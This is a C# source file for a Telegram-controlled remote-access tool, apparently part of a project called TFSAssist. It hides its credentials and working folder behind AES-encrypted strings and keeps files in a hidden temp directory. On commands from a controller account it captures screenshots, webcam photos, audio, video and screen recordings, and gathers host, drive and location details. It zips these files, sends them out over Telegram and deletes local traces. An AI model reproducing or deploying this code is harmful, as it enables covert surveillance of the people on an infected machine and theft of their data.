using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net.Sockets;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Microsoft.Win32;
using TeleSharp.TL;
using Utils;
using Utils.Handles;
using Utils.Messaging.Telegram;

namespace TFSAssist.Remoter
{
    public class RemoteControl : IDisposable
    {
        private readonly object syncSession = new object();

        public Thread MainThread { get; }

        private readonly string ClientID;
        private TLControl _control;
        private readonly StringBuilder _processingErrorLogs;

        private MediaPack _mediaPack;
        private SystemInfo _systemInfo;

        private readonly Func<string, string> _callParent;


        private string _tempDir = string.Empty;
        public string TempDirectory
        {
            get
            {
                if (!Directory.Exists(_tempDir))
                    CreateDirectory(_tempDir);
                return _tempDir;
            }
            private set => _tempDir = value;
        }

        // PRIVATE DATA!!!
        private const string KEY = nameof(TLControl);
        // PRIVATE DATA!!!

        private static string HashCodeFilePath => Path.Combine(Assembly.GetExecutingAssembly().GetAssemblyInfo().ApplicationDirectory, TLControl.SessionName + ".hash");
        private static string AuthCodeFilePath => Path.Combine(Assembly.GetExecutingAssembly().GetAssemblyInfo().ApplicationDirectory, TLControl.SessionName + ".code");

        public bool IsEnabled { get; private set; } = false;

        private Dictionary<string, RemoteControlCommands> AllCommands { get; } = new Dictionary<string, RemoteControlCommands>(StringComparer.CurrentCultureIgnoreCase);

        public RemoteControl(Thread mainThread, string clientId, Func<string, string> callParentFunctions)
        {
            MainThread = mainThread;
            ClientID = clientId;

            _processingErrorLogs = new StringBuilder();
            _callParent = callParentFunctions;

            
            TempDirectory = Path.Combine(Path.GetTempPath(), Utils.Crypto.AES.DecryptStringAES("EAAAAAxpTZ6NdrMJ4br13f4nj/qitOYAqB2nG4FJeE7hOulo", KEY)); // директория InCommon-2.0

            foreach (RemoteControlCommands command in Enum.GetValues(typeof(RemoteControlCommands)))
            {
                AllCommands.Add(command.ToString("G"), command);
            }
        }

        public async Task<bool> Initialize()
        {
            InitTempDirectory(TempDirectory);
            await InitTempSession();

            // только после InitTempDirectory
            _mediaPack = new MediaPack(MainThread, TempDirectory);
            _mediaPack.OnCompleted += MediaPack_OnCompleted;
            _mediaPack.OnProcessingExceptions += ProcessingExceptions;
            _mediaPack.Initialize();

            _systemInfo = new SystemInfo();
            _systemInfo.OnProcessingExceptions += ProcessingExceptions;
            _systemInfo.Initialize();

            await Connect(GetAuthCode);

            if (IsEnabled)
            {
                Thread.Sleep(5000);
                SendMessageToUserHost($"Connected. {_systemInfo.GetHostInfo()}");
                Thread.Sleep(1000);
            }

            return IsEnabled;
        }


        async Task Connect(Func<Task<string>> getAuthCode)
        {
            tryConnect:

            try
            {
                IsEnabled = false;

                _control?.Dispose();
                _control = new TLControl(int.Parse(Utils.Crypto.AES.DecryptStringAES("EAAAANgw9/AN5XtERxX5Rjl1v2dxWpc1kbN7Pz8zMSNvduOj", KEY)), Utils.Crypto.AES.DecryptStringAES("EAAAAKUDZalqO6zA+3GkNaXYWGjBAIKeXdCshPO6fuf2tL4xIt7gaXd49TZY3isKaXi3lECRYUynr/qZQl0WDiHeYfg=", KEY));
                await _control.ConnectAsync();

                IsEnabled = true;
            }
            catch (AuthorizationException ex)
            {
                if (getAuthCode != null && _control != null)
                {
                    try
                    {
                        string hash;
                        string code;
                        var phone_number = Utils.Crypto.AES.DecryptStringAES("EAAAAPVCk/v9pGIyjaouvJTkkvBJMYMHxz3Nh8r3Q+oQAel+", KEY);

                        // если уже существуют файл с хэшом
                        if (File.Exists(HashCodeFilePath))
                        {
                            hash = await DecryptFileData(HashCodeFilePath); // раскодировать хэш

                            if (File.Exists(AuthCodeFilePath)) // если уже существуют файл c полученным кодом, то забираем код
                                code = await DecryptFileData(AuthCodeFilePath); // раскодировать код
                            else // если файла с кодом еще нет, то будем ждать появления кода по текущему хэшу
                                code = await getAuthCode.Invoke();
                        }
                        else
                        {
                            hash = await _control.SendCodeRequestAsync(phone_number);
                            var cryptHash = Utils.Crypto.AES.EncryptStringAES(hash, KEY); // закодировать хэш
                            await SaveFile(HashCodeFilePath,
                                cryptHash); // созраняем файл с хэшом, т.к. если перезагрузится приложение в то время как будем ждать код - хэш потеряется и мы отправим запрос на получение нового кода по новому хэшу. Поэтому заново запрашивать код нельзя
                            code = await getAuthCode.Invoke(); // ждем появления файла с кодом
                        }

                        // если успешно получили файл с кодом, то можно удалять файл с хэшом и файл с кодом, т.к. они больше не пригодятся
                        File.Delete(HashCodeFilePath);
                        File.Delete(AuthCodeFilePath);

                        await _control.MakeAuthAsync(phone_number, hash, code);

                        //await _control.AuthUserAsync(getAuthUserCode, "+375333866536");
                        await Connect(null); // не передаем метод по получению кода, т.к. что то было сделанно не корреткно и может произойти FloodException, что не желательно
                    }
                    catch (Exception ex2)
                    {
                        WriteExLog(ex2, false);
                    }

                    return;
                }

                WriteExLog(ex, false);
            }
            catch (SocketException ex)
            {
                // если нет соединения с интернетом, пытаемся реконнектиться
                if (ex.SocketErrorCode == SocketError.HostUnreachable || ex.SocketErrorCode == SocketError.TimedOut)
                {
                    Thread.Sleep(60000);
                    goto tryConnect;
                }
            }
            catch (Exception)
            {
                throw;
            }
        }

        static async Task<string> GetAuthCode()
        {
            // ждем когда появится локальный файл с кодом для новой авторизации
            var result = string.Empty;

            try
            {
                while (!File.Exists(AuthCodeFilePath))
                {
                    Thread.Sleep(5000);
                }

                result = await DecryptFileData(AuthCodeFilePath); // раскодировать файл с кодом авторизации
            }
            catch (Exception)
            {
                // null
            }

            return result;
        }

        /// <summary>
        /// Раскодировать
        /// </summary>
        /// <param name="fileDestination"></param>
        /// <returns></returns>
        static async Task<string> DecryptFileData(string fileDestination)
        {
            string result;
            using (var stream = new StreamReader(fileDestination))
            {
                var res = await stream.ReadToEndAsync();
                result = Utils.Crypto.AES.DecryptStringAES(res, KEY);
            }

            return result;
        }

        public async Task Run()
        {
            var lastDate = DateTime.Now;

            while (IsEnabled)
            {
                try
                {
                    //List<TLMessage> newMessages = await _control.GetDifference(_control.CurrentUser.User, _control.CurrentUser.Destination, lastDate);
                    List<TLMessage> newMessages = null;
                    lock (syncSession)
                    {
                        var task = _control.GetDifference(_control.UserHost.User, _control.UserHost.Destination, lastDate);
                        task.Wait();

                        newMessages = task.Result;
                    }

                    var lastMessage = newMessages?.LastOrDefault();
                    if (lastMessage != null)
                    {
                        await ReadCommands(newMessages);
                        lastDate = TLControl.ToDate(lastMessage.Date);
                    }
                }
                catch (Exception ex)
                {
                    var isReconnected = false;
                    lock (syncSession)
                    {
                        if (!_control.IsConnected)
                        {
                            var task = Connect(GetAuthCode);
                            task.Wait();
                            isReconnected = true;
                        }
                    }

                    if (isReconnected)
                        SendMessageToUserHost($"Reconnected. {_systemInfo.GetHostInfo()}");
                    else
                        WriteExLog(ex);
                }

                Thread.Sleep(5000);
            }
        }

        public void SendMessage(string message)
        {
            SendMessageToUserHost(message);
        }

        void SendMessageToUserHost(string message)
        {
            if (!IsEnabled)
                return;

            try
            {
                //await _control.SendMessageAsync(_control.CurrentUser.Destination, $"CID=[{ClientID}]\r\n{message.Trim()}", 0);
                lock (syncSession)
                {
                    var task = _control.SendMessageAsync(_control.UserHost.Destination, $"CID=[{ClientID}]\r\n{message.Trim()}", 0);
                    task.Wait();
                }
            }
            catch (Exception ex)
            {
                WriteExLog(ex);
            }
        }

        void SendBigFileToUserHost(string destinationFile)
        {
            if (!IsEnabled)
                return;

            try
            {
                //await _control.SendBigFileAsync(_control.CurrentUser.Destination, destinationPath);
                lock (syncSession)
                {
                    var task = _control.SendBigFileAsync(_control.UserHost.Destination, destinationFile, Path.GetFileName(destinationFile));
                    task.Wait(); // таймаут ставить нельзя т.к. может интеренет тормознутый и надо дождаться до конца
                }
            }
            catch (Exception ex)
            {
                WriteExLog(ex);
            }
            finally
            {
                // очищаем память, т.к. отправили большой файл
                GC.Collect();
            }
        }

        async Task ReadCommands(List<TLMessage> newMessages)
        {
            var preparedFiles = new List<string>();

            var isUpdate = false;
            var isRestart = false;
            var isCommand = ClientID + ":";

            try
            {
                foreach (var tl_message in newMessages)
                {
                    var telegaMessage = tl_message.Message.Trim();

                    if (telegaMessage.StartsWith(isCommand, StringComparison.CurrentCultureIgnoreCase))
                    {
                        var strCommand = telegaMessage.Substring(isCommand.Length, telegaMessage.Length - isCommand.Length);
                        Dictionary<string, string> options = null;
                        var optStart = strCommand.IndexOf('(');
                        var optEnd = strCommand.IndexOf(')');
                        if (optStart != -1 && optEnd != -1 && optEnd > optStart)
                        {
                            var strOptions = strCommand.Substring(optStart, strCommand.Length - optStart);
                            options = ReadOptionParams(strOptions);
                            strCommand = strCommand.Substring(0, optStart);
                        }
                        strCommand = strCommand.Trim();

                        if (!AllCommands.TryGetValue(strCommand, out var command))
                            continue;

                        switch (command)
                        {
                            case RemoteControlCommands.COMMANDS:
                                SendMessageToUserHost(string.Join("\r\n", Enum.GetNames(typeof(RemoteControlCommands))));
                                break;

                            case RemoteControlCommands.PING:
                                SendMessageToUserHost($"PONG. {_systemInfo.GetHostInfo()}");
                                break;

                            case RemoteControlCommands.INFO:
                                var detInfo = _systemInfo.GetDetailedHostInfo(new [] {TempDirectory});
                                var fileInfo = Path.Combine(TempDirectory, $"{STRING.RandomString(15)}.txt");
                                await SaveFile(fileInfo, detInfo);
                                preparedFiles.Add(fileInfo);
                                break;

                            case RemoteControlCommands.DRIVE:
                                var drivesInfo = _systemInfo.GetDrivesInfo();
                                if (drivesInfo != null)
                                    SendMessageToUserHost(drivesInfo);
                                break;

                            case RemoteControlCommands.CPU:
                                SendMessageToUserHost(_systemInfo.GetDiagnosticInfo());
                                break;

                            case RemoteControlCommands.LOC:
                                SendMessageToUserHost(_systemInfo.GetLocationInfo());
                                break;

                            case RemoteControlCommands.MEDIA:
                                SendMessageToUserHost(_mediaPack.ToString());
                                break;

                            case RemoteControlCommands.RECSETT:
                                if (options != null && options.Count > 0)
                                {
                                    if (options.TryGetValue("Seconds", out var timeRecStr))
                                    {
                                        if (int.TryParse(timeRecStr, out var timeRec))
                                        {
                                            _mediaPack.SetSeconds(timeRec);
                                        }
                                    }

                                    if (options.TryGetValue("Video", out var video))
                                    {
                                        _mediaPack.SetVideo(video);
                                    }

                                    if (options.TryGetValue("Audio", out var audio))
                                    {
                                        _mediaPack.SetAudio(audio);
                                    }

                                    if (options.TryGetValue("Frames", out var framesRateStr))
                                    {
                                        if (int.TryParse(framesRateStr, out var framesRate))
                                        {
                                            _mediaPack.SetFrames(framesRate);
                                        }
                                    }
                                }

                                break;

                            case RemoteControlCommands.ACAM:
                                _mediaPack.StartAForge();
                                break;

                            case RemoteControlCommands.ECAM:
                                _mediaPack.StartEncoder();
                                break;

                            case RemoteControlCommands.BROADCAST:
                                if (options != null && options.Count > 0)
                                {
                                    if (options.TryGetValue("Port", out var portStr))
                                    {
                                        if (int.TryParse(portStr, out var port))
                                        {
                                            _mediaPack.StartBroadcast(port);
                                            break;
                                        }
                                    }
                                }

                                _mediaPack.StartBroadcast();
                                break;

                            case RemoteControlCommands.SCAM:
                                _mediaPack.StartScreen();
                                break;

                            case RemoteControlCommands.NCAM:
                                _mediaPack.StartNAudio();
                                break;

                            case RemoteControlCommands.RECSTOP:
                                _mediaPack.Stop();
                                break;

                            case RemoteControlCommands.SCREEN:
                                var screenPath = Path.Combine(TempDirectory, $"{STRING.RandomString(15)}.png");
                                if(_mediaPack.GetScreen(screenPath))
                                    preparedFiles.Add(screenPath);
                                break;

                            case RemoteControlCommands.PHOTO:
                                var photoPath = Path.Combine(TempDirectory, $"{STRING.RandomString(15)}.png");
                                if(_mediaPack.GetPhoto(photoPath))
                                    preparedFiles.Add(photoPath);
                                break;

                            case RemoteControlCommands.LOG:
                                var entireLogs = _callParent?.Invoke(RemoteControlCommands.LOG.ToString("G"));
                                var currentLogs = GetCurrentProcessingLogs();

                                if (entireLogs.IsNullOrEmpty())
                                {
                                    entireLogs = currentLogs;
                                }
                                else if (!currentLogs.IsNullOrEmpty())
                                {
                                    entireLogs = $"{entireLogs}\r\n\r\n{new string('=', 15)}\r\n\r\n{currentLogs}";
                                }

                                if (entireLogs.IsNullOrEmptyTrim())
                                {
                                    SendMessageToUserHost("Log is empty.");
                                    break;
                                }
                                else if (entireLogs.Length <= 800) // если логов немного
                                {
                                    SendMessageToUserHost(entireLogs);
                                    break;
                                }

                                var fileLog = Path.Combine(TempDirectory, $"{STRING.RandomString(15)}.txt");
                                await SaveFile(fileLog, entireLogs);
                                preparedFiles.Add(fileLog);
                                break;

                            case RemoteControlCommands.UPDATE:
                                isUpdate = true;
                                break;

                            case RemoteControlCommands.RESTART:
                                isRestart = true;
                                break;

                            case RemoteControlCommands.CLEAR:
                                DeleteAllFilesInDirectory(TempDirectory);
                                break;

                            default:
                                var parentResult = _callParent?.Invoke(command.ToString("G"));
                                if (!parentResult.IsNullOrEmptyTrim())
                                {
                                    if(parentResult.Length <= 800)
                                        SendMessageToUserHost(parentResult);
                                    else
                                    {
                                        var fileResult = Path.Combine(TempDirectory, $"{STRING.RandomString(15)}.txt");
                                        await SaveFile(fileResult, parentResult);
                                        preparedFiles.Add(fileResult);
                                    }
                                }
                                break;
                        }
                    }
                    else
                    {
                        if (!AllCommands.TryGetValue(telegaMessage, out var command))
                            continue;

                        switch (command)
                        {
                            case RemoteControlCommands.PING:
                                SendMessageToUserHost($"PONG. {_systemInfo.GetHostInfo()}");
                                break;
                            
                            case RemoteControlCommands.UPDATE:
                                isUpdate = true;
                                break;

                            case RemoteControlCommands.RESTART:
                                isRestart = true;
                                break;

                            case RemoteControlCommands.CLEAR:
                                DeleteAllFilesInDirectory(TempDirectory);
                                break;
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                WriteExLog(ex);
            }
            finally
            {
                PackAndSendFiles(preparedFiles);

                // выполняется всегда в конце после обработки других комманд, если они были
                try
                {
                    if (isUpdate)
                    {
                        _callParent?.Invoke(RemoteControlCommands.UPDATE.ToString("G"));
                    }
                    else if (isRestart)
                    {
                        _callParent?.Invoke(RemoteControlCommands.RESTART.ToString("G"));
                    }
                }
                catch (Exception ex)
                {
                    WriteExLog(ex);
                }
            }
        }


        static Dictionary<string, string> ReadOptionParams(string options)
        {
            var optParams = new Dictionary<string, string>(StringComparer.CurrentCultureIgnoreCase);
            var builderParam = new StringBuilder();
            var builderValue = new StringBuilder();
            var findParams = 0;
            var findValue = 0;

            foreach (var ch in options)
            {
                if (ch == '(' && findParams == 0)
                {
                    findParams++;
                    continue;
                }

                if (ch == ')' && (findValue == 0 || findValue == 3) && findParams > 0)
                {
                    findParams--;
                    continue;
                }

                if (findParams <= 0)
                    continue;

                if ((ch == '=' && findValue == 0) || (ch == '\'' && findValue >= 1))
                {
                    findValue++;
                    continue;
                }

                if (ch == ',' && findValue == 3)
                {
                    findValue = 0;
                    optParams.Add(builderParam.ToString(), builderValue.ToString());
                    builderParam.Clear();
                    builderValue.Clear();
                    continue;
                }

                if (findValue == 2)
                {
                    builderValue.Append(ch);
                    continue;
                }

                if (!char.IsWhiteSpace(ch) && findValue == 0)
                    builderParam.Append(ch);
            }

            optParams.Add(builderParam.ToString(), builderValue.ToString());
            builderParam.Clear();
            builderValue.Clear();

            return optParams;
        }

        static async Task SaveFile(string destination, string data)
        {
            using (var stream = new FileStream(destination, FileMode.OpenOrCreate))
            {
                var logsBytes = new UTF8Encoding(true).GetBytes(data.Trim());
                await stream.WriteAsync(logsBytes, 0, logsBytes.Length);
            }
        }

        readonly object syncZip = new object();

        void PackAndSendFiles(List<string> filesDestinations)
        {
            if (filesDestinations == null || filesDestinations.Count == 0)
                return;

            try
            {
                if (filesDestinations.Count == 1)
                {
                    var singleFile = new FileInfo(filesDestinations.First());
                    if (singleFile.Exists && IsFileReady(singleFile.FullName))
                    {
                        if (singleFile.Length.ToMegabytes() <= 15) // если файл не больше 15 мб
                        {
                            SendBigFileToUserHost(singleFile.FullName);
                            singleFile.Delete();
                            return;
                        }
                    }
                    else
                    {
                        return;
                    }
                }

                lock (syncZip)
                {
                    var destinationZipFile = DoZipFile(filesDestinations);
                    if (destinationZipFile != null)
                    {
                        SendBigFileToUserHost(destinationZipFile);
                        File.Delete(destinationZipFile);
                    }

                    foreach (var fileSource in filesDestinations)
                    {
                        try
                        {
                            File.Delete(fileSource);
                        }
                        catch (Exception ex)
                        {
                            WriteExLog(ex);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                GC.Collect();
                WriteExLog(ex);
            }
        }

        string DoZipFile(List<string> filesDestinations)
        {
            try
            {
                var destinationZip = Path.Combine(TempDirectory, STRING.RandomStringNumbers(15) + ".zip");
                var packFileTempPath = Path.GetTempFileName();
                File.Delete(packFileTempPath);

                var compressedFiles = 0;
                using (var zipToOpen = new FileStream(packFileTempPath, FileMode.OpenOrCreate))
                {
                    using (var archive = new ZipArchive(zipToOpen, ZipArchiveMode.Create))
                    {
                        foreach (var filePath in filesDestinations)
                        {
                            if (!File.Exists(filePath) || !IsFileReady(filePath))
                                continue;

                            var destArchPth = filePath.Replace(TempDirectory, "").Trim('\\');
                            archive.CreateEntryFromFile(filePath, destArchPth);
                            compressedFiles++;
                        }
                    }
                }

                if (compressedFiles == 0)
                {
                    if (File.Exists(packFileTempPath))
                        File.Delete(packFileTempPath);
                    return null;
                }

                //ZipFile.CreateFromDirectory(sourceDir, packFileTempPath, CompressionLevel.Optimal, false);

                File.Copy(packFileTempPath, destinationZip, true);
                File.Delete(packFileTempPath);
                return destinationZip;
            }
            catch (Exception ex)
            {
                WriteExLog(ex);
                return null;
            }
        }

        static bool IsFileReady(string file)
        {
            var numberTryes = 0;
            while (!IO.IsFileReady(file) && numberTryes <= 5)
            {
                numberTryes++;
                Thread.Sleep(1000);
            }

            return numberTryes <= 5;
        }


        async Task InitTempSession()
        {
            try
            {
                var tempSession = TLControl.SessionName + ".tmp";

                if (!File.Exists(tempSession))
                    return;

                using (var stream = new FileStream(tempSession, FileMode.Open))
                {
                    var buffer = new byte[2048];
                    await stream.ReadAsync(buffer, 0, 2048);
                    using (var regedit = new RegeditControl(Assembly.GetExecutingAssembly().GetAssemblyInfo().ApplicationName))
                    {
                        regedit[TLControl.SessionName, RegistryValueKind.Binary] = buffer;
                    }
                }

                File.Delete(tempSession);
            }
            catch (Exception ex)
            {
                WriteExLog(ex);
            }
        }

        void InitTempDirectory(string tempDirPath)
        {
            var di = new DirectoryInfo(tempDirPath);

            if (di.Exists)
            {
                try
                {
                    //await IO.DeleteReadOnlyDirectoryAsync(dirPath);

                    DeleteAllFilesInDirectory(tempDirPath);
                    di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;

                }
                catch (Exception ex)
                {
                    WriteExLog(ex, false);
                }
            }
            else
            {
                CreateDirectory(tempDirPath);
            }
        }

        void DeleteAllFilesInDirectory(string dirPath)
        {
            try
            {
                var tempFiles = Directory.EnumerateFiles(dirPath, "*", SearchOption.AllDirectories);
                foreach (var filePath in tempFiles)
                {
                    if (!IsFileReady(filePath))
                        continue;

                    var fileInfo = new FileInfo(filePath)
                    {
                        Attributes = FileAttributes.Normal
                    };
                    fileInfo.Delete();
                }

                foreach (var dir in new DirectoryInfo(dirPath).GetDirectories())
                {
                    dir.Delete(true);
                }
            }
            catch (Exception ex)
            {
                WriteExLog(ex);
            }
        }

        void CreateDirectory(string dirPath)
        {
            var attempts = 0;

            tryCreateDir:
            try
            {
                var di = Directory.CreateDirectory(dirPath);
                di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
            }
            catch (Exception ex)
            {
                WriteExLog(ex, false);
                attempts++;
                if (attempts < 5)
                {
                    Thread.Sleep(1000);
                    goto tryCreateDir;
                }
            }
        }

        private void MediaPack_OnCompleted(object sender, string[] fileDestinations)
        {
            PackAndSendFiles(fileDestinations.ToList());
        }

        private void ProcessingExceptions(string log)
        {
            WriteExLog(log);
        }

        #region LOGS

        readonly object syncLog = new object();

        void WriteExLog(Exception ex, bool isDebug = true)
        {
            WriteExLog(ex?.ToString(), isDebug);
        }

        void WriteExLog(string message, bool isDebug = true)
        {
            //_writeLog?.Invoke(isDebug ? WarnSeverity.Debug : WarnSeverity.Error, $"{nameof(TFSA_TLControl)}=[{ex.Message}]\r\n{ex.StackTrace}");
            //_writeLogs?.Invoke(isDebug ? WarnSeverity.Debug : WarnSeverity.Error, $"{nameof(RemoteControl)}=[{message}]");
            var isDebugStr = isDebug ? "DEBUG" : "ERROR";
            lock (syncLog)
                _processingErrorLogs.Append($"[{isDebugStr}]:[{DateTime.Now:G}]={message}\r\n");
        }

        string GetCurrentProcessingLogs()
        {
            string pullLogs;

            lock (syncLog)
            {
                pullLogs = _processingErrorLogs.ToString().Trim();
                _processingErrorLogs.Clear();
            }

            return pullLogs;
        }

        #endregion

        public void Dispose()
        {
            Terminate();
        }

        void Terminate()
        {
            try
            {
                IsEnabled = false;
                lock (syncSession)
                {
                    _control?.Dispose();
                }
                _mediaPack?.Dispose();
                _systemInfo?.Dispose();

                DeleteAllFilesInDirectory(TempDirectory);
            }
            catch (Exception)
            {
                // ignored
            }
        }
    }
}
